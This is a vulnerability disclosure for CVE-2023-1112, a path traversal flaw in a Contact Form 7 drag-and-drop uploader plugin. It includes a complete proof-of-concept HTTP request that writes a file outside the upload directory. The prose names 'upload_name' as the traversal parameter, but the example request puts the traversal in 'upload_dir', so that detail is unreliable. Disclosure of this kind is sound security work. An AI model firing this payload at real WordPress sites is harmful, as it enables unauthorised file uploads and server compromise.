# CVE-2023-1112 - Drag and Drop Multiple File Uploader PRO - Contact Form 7 v5.0.6.1 Path Traversal

# Info
Path Traversal in Drag and Drop Multiple File Uploader PRO - Contact Form 7 version 5.0.6.1 allows unauthenticated remote attacker to upload files anywhere writable on the remote server (CVE-2023-1112).

To exploit this vulnerability, the attacker needs to upload a file using the plugin's form. On this post request there needs to be the parameter `upload_name`, which value is the name of the folder to which the file will be uploaded. The attacker can put anything he wants, such as `../`, `../../../`, `foldername` (it will create the folder "foldername" on the upload directory), etc.

# Example

```
POST /wp-admin/admin-ajax.php HTTP/2
Host: example.org
Content-Length: 756
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIzvIrbHjHpxzepPi
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="size_limit"

2e+9
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="upload_dir"

../../../
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="post_id"

1868
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="security"

0a4dca2b89
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="form_id"

9210
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="upload_name"

foto
------WebKitFormBoundaryIzvIrbHjHpxzepPi
Content-Disposition: form-data; name="upload-file"; filename="pngout.png"
Content-Type: image/png

// image contents
------WebKitFormBoundaryIzvIrbHjHpxzepPi--

```
# Screenshots

### Normal request
![image](https://user-images.githubusercontent.com/3837916/216743824-2a11a7e6-d954-4a1d-ac98-7ddc0d996dcd.png)

### Malicious request
![image](https://user-images.githubusercontent.com/3837916/216743964-378a88d4-ed53-481b-a748-8c09c9868070.png)

### Malicious request successully uploaded the file to the webserver root
![image](https://user-images.githubusercontent.com/3837916/216744024-50997229-58d5-4e76-9e74-aa4c9fc27a00.png)
